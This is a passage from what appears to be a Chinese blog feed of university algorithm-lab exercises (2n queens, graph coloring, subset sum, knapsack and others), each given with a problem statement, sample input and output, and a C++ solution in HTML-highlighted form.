class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2000</span>;</span><br><span class="line"><span class="keyword">int</span> num[<span class="number">30</span>],ans;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cmp1</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span>&amp; a,<span class="keyword">int</span>&amp; b)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> a &gt; b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> t;</span><br><span class="line">    <span class="keyword">char</span> str[maxn];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;str;</span><br><span class="line">        <span class="built_in">memset</span>(num,<span class="number">0</span>,<span class="keyword">sizeof</span>(num));</span><br><span class="line">        <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">            num[<span class="keyword">int</span>(str[i]-<span class="string">'a'</span>)]++;</span><br><span class="line">        priority_queue&lt;<span class="keyword">int</span>,<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;,cmp1&gt; pq;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i++)</span><br><span class="line">            <span class="keyword">if</span>(num[i]) pq.push(num[i]);</span><br><span class="line">        ans = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(pq.size() &gt; <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> a,b;</span><br><span class="line">            a = pq.top();</span><br><span class="line">            pq.pop();</span><br><span class="line">            b = pq.top();</span><br><span class="line">            pq.pop();</span><br><span class="line">            pq.push(a+b);</span><br><span class="line">            ans += a+b;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-C-2n皇后问题"><a href="#问题-C-2n皇后问题" class="headerlink" title="问题 C: 2n皇后问题"></a>问题 C: 2n皇后问题</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定一个 <em>n\</em>n*的棋盘，棋盘中有一些位置不能放皇后。现在要向棋盘中放入 n 个黑皇后和 n个白皇后，使任意的两个黑皇后都不在同一行、同一列或同一条对角线上，任意的两个白皇后都不在同一行、同一列或同一条对角线上。问总共有多少种放法？n 小于等于 8。</p><h3 id="输入-2"><a href="#输入-2" class="headerlink" title="输入"></a>输入</h3><p> 输入的第一行为一个整数 n，表示棋盘的大小。</p><p>​    接下来 n 行，每行 n 个 0 或 1 的整数，如果一个整数为1，表示对应的位置可以放皇后，如果一个整数为 0，表示对应的位置不可以放皇后。</p><h3 id="输出-2"><a href="#输出-2" class="headerlink" title="输出"></a>输出</h3><p>输出一个整数，表示总共有多少种放法</p><h3 id="样例输入-2"><a href="#样例输入-2" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br><span class="line">1 1 1 1</span><br></pre></td></tr></table></figure><h3 id="样例输出-2"><a href="#样例输出-2" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2</span><br></pre></td></tr></table></figure><h3 id="提示-2"><a href="#提示-2" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">10</span>;</span><br><span class="line"><span class="keyword">int</span> map_q[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> x1[maxn],x2[maxn],ans,n;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check1</span><span class="params">(<span class="keyword">int</span> xx,<span class="keyword">int</span> yy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!map_q[xx][yy]) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; xx; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(yy == x1[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(xx - i) == <span class="built_in">abs</span>(yy - x1[i])) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//斜对角</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check2</span><span class="params">(<span class="keyword">int</span> xx,<span class="keyword">int</span> yy)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!map_q[xx][yy]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; xx; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(yy == x2[i]) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">abs</span>(xx - i) == <span class="built_in">abs</span>(yy - x2[i])) <span class="keyword">return</span> <span class="literal">false</span>; <span class="comment">//斜对角</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">queen</span><span class="params">(<span class="keyword">int</span> l)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l == n)</span><br><span class="line">    &#123;</span><br><span class="line">        ans++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(check1(l,i))</span><br><span class="line">        &#123;</span><br><span class="line">            x1[l] = i;</span><br><span class="line">            map_q[l][i] = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(check2(l,j))</span><br><span class="line">                &#123;</span><br><span class="line">                    x2[l] = j;</span><br><span class="line">                    queen(l+<span class="number">1</span>);</span><br><span class="line">                    x2[l] = <span class="number">-1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            map_q[l][i] = <span class="number">1</span>;</span><br><span class="line">            x1[l] = <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;map_q[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ans = <span class="number">0</span>;</span><br><span class="line">    queen(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-D-图的m着色问题"><a href="#问题-D-图的m着色问题" class="headerlink" title="问题 D: 图的m着色问题"></a>问题 D: 图的m着色问题</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定无向连通图G和m种不同的颜色，用这些颜色给图的各个顶点着一种颜色，若某种方案使得图中每条边的2个顶点的颜色都不相同，则是一个满足的方案，找出所有的方案。</p><h3 id="输入-3"><a href="#输入-3" class="headerlink" title="输入"></a>输入</h3><p>第一行有3个正整数n，k和m，分别表示n个顶点，k条边，m种颜色<br>接下来k行，每行2个正整数，表示一条边的两个顶点</p><h3 id="输出-3"><a href="#输出-3" class="headerlink" title="输出"></a>输出</h3><p>所有不同的着色方案数</p><h3 id="样例输入-3"><a href="#样例输入-3" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">5 8 4 </span><br><span class="line">1 2</span><br><span class="line">1 3 </span><br><span class="line">1 4</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">2 5</span><br><span class="line">3 4</span><br><span class="line">4 5</span><br></pre></td></tr></table></figure><h3 id="样例输出-3"><a href="#样例输出-3" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">48</span><br></pre></td></tr></table></figure><h3 id="提示-3"><a href="#提示-3" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">2e3</span> + <span class="number">5</span>;</span><br><span class="line"><span class="keyword">int</span> n,k,m,ans;</span><br><span class="line"><span class="keyword">int</span> map_c[maxn][maxn];</span><br><span class="line"><span class="keyword">int</span> color[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> d)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(d == n+<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ans++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= m; i++)     <span class="comment">//颜色m种</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)     <span class="comment">//n个点</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(map_c[d][j] &amp;&amp; color[j] == i)  <span class="comment">//连通且颜色为i则失败</span></span><br><span class="line">            &#123;</span><br><span class="line">                flag = <span class="literal">false</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(flag)</span><br><span class="line">        &#123;</span><br><span class="line">            color[d] = i;   <span class="comment">//染色</span></span><br><span class="line">            dfs(d+<span class="number">1</span>);       <span class="comment">//下一结点</span></span><br><span class="line">            color[d] = <span class="number">0</span>;   <span class="comment">//回到未染色状态</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;k&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> tmp1,tmp2;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;tmp1&gt;&gt;tmp2;</span><br><span class="line">        map_c[tmp1][tmp2] = <span class="number">1</span>;</span><br><span class="line">        map_c[tmp2][tmp1] = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-E-部分和问题"><a href="#问题-E-部分和问题" class="headerlink" title="问题 E: 部分和问题"></a>问题 E: 部分和问题</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p>给定n个整数，判断是否可以从中选择若干数字，使得他们的和恰好为k。</p><h3 id="输入-4"><a href="#输入-4" class="headerlink" title="输入"></a>输入</h3><p>多组测试用例。</p><p>对于每组测试用例，第一行一个正整数n，第二行n个整数，第三行一个整数k。</p><p><em>1*</em>≤<strong>N</strong>≤*<em>20</em>，输入整数及k均小于<em>1e8</em>。</p><h3 id="输出-4"><a href="#输出-4" class="headerlink" title="输出"></a>输出</h3><p>若可以使得和为k，输出”Yes”,否则”No”。</p><h3 id="样例输入-4"><a href="#样例输入-4" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">4</span><br><span class="line">1 2 4 7</span><br><span class="line">13</span><br></pre></td></tr></table></figure><h3 id="样例输出-4"><a href="#样例输出-4" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Yes</span><br></pre></td></tr></table></figure><h3 id="提示-4"><a href="#提示-4" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt; </span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn = <span class="number">25</span>;</span><br><span class="line"><span class="keyword">int</span> n,a[maxn],k;</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> sum)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(sum == k) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(l == n) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> dfs(l+<span class="number">1</span>,sum)||dfs(l+<span class="number">1</span>,sum+a[l]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;n)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;k;</span><br><span class="line">        <span class="keyword">if</span>(dfs(<span class="number">0</span>,<span class="number">0</span>)) </span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"Yes"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="string">"No"</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>算法实验（三）</title>
      <link href="/2019/10/24/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C3/"/>
      <url>/2019/10/24/%E7%AE%97%E6%B3%95%E5%AE%9E%E9%AA%8C3/</url>
      
        <content type="html"><![CDATA[<p>算法实验三。</p><a id="more"></a><h2 id="问题-A-评分系统"><a href="#问题-A-评分系统" class="headerlink" title="问题 A: 评分系统"></a>问题 A: 评分系统</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>英语俱乐部举办了一个叫做“英文金曲大赛”的节目。这个节目有好多人参加，这不，成绩出来了，渊子当是很勇敢，自告奋勇接下了算出大家的总得分的任务。当时有7个评委，每个评委都要给选手打分，现在要求去掉一个最高分和去掉一个最低分，再算出平均分。结果精确到小数点后两位。</p><h3 id="输入"><a href="#输入" class="headerlink" title="输入"></a>输入</h3><p>测试数据包括多个实例。每组数据包括7个实数，代表评委们对该选手的评分。紧接着是选手的名字，名字的长度不超过30个字符。输入直到文件结束。</p><h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><p>输出每位选手名字和最终得分，结果保留两位有效数字。</p><h3 id="样例输入"><a href="#样例输入" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10 10 10 10 10 10 9 xiaoyuanwang</span><br><span class="line">0 0 0 0 0 0 0 beast</span><br></pre></td></tr></table></figure><h3 id="样例输出"><a href="#样例输出" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xiaoyuanwang 10.00</span><br><span class="line">beast 0.00</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">double</span> a[<span class="number">7</span>],sum=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">cin</span>&gt;&gt;a[<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        sum=a[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;<span class="number">7</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">            sum+=a[i];</span><br><span class="line">        &#125;</span><br><span class="line">        sort(a,a+<span class="number">7</span>);</span><br><span class="line">        <span class="built_in">string</span> s;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;s&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        sum=sum-a[<span class="number">0</span>]-a[<span class="number">6</span>];</span><br><span class="line">        sum=sum/<span class="number">5.0</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;setprecision(<span class="number">2</span>)&lt;&lt;<span class="built_in">std</span>::fixed&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="问题-B-节食的限制"><a href="#问题-B-节食的限制" class="headerlink" title="问题 B: 节食的限制"></a>问题 B: 节食的限制</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>Bessie像她的诸多姊妹一样，因為从Farmer John的草地吃了太多美味的草而长出了太多的赘肉。所以FJ将她置於一个及其严格的节食计划之中。她每天不能吃多过H(5&lt;=H&lt;=45000)公斤的乾草。Bessie只能吃一整綑乾草；当她开始吃一綑乾草的之后就再也停不下来了。她有一个完整的N(1&lt;=n&lt;=50)綑可以给她当作晚餐的乾草的清单。她自然想要尽量吃到更多的乾草。很自然地，每綑乾草只能被吃一次（即使在列表中相同的重量可能出现2次，但是这表示的是两綑乾草，其中每綑乾草最多只能被吃掉一次）。 给定一个列表表示每綑乾草的重量Si(1&lt;=Si&lt;=H),求Bessie不超过节食的限制的前提下可以吃掉多少乾草（注意一旦她开始吃一綑乾草就会把那一綑乾草全部吃完）。</p><h3 id="输入-1"><a href="#输入-1" class="headerlink" title="输入"></a>输入</h3><p>第一行：两个由空格隔开的整数：H和N， 第2到N+1行：第i+1行是一个单独的整数，表示第i綑乾草的重量Si。</p><h3 id="输出-1"><a href="#输出-1" class="headerlink" title="输出"></a>输出</h3><p>一个单独的整数表示Bessie在限制范围内最多可以吃多少公斤的乾草。</p><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入"></a>样例输入</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">56 4</span><br><span class="line">15</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td></tr></table></figure><h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出"></a>样例输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">56</span><br></pre></td></tr></table></figure><h3 id="提示-1"><a href="#提示-1" class="headerlink" title="提示"></a>提示</h3><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">45001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> h,z,a[<span class="number">501</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;h&gt;&gt;z;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=z;i++)</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> 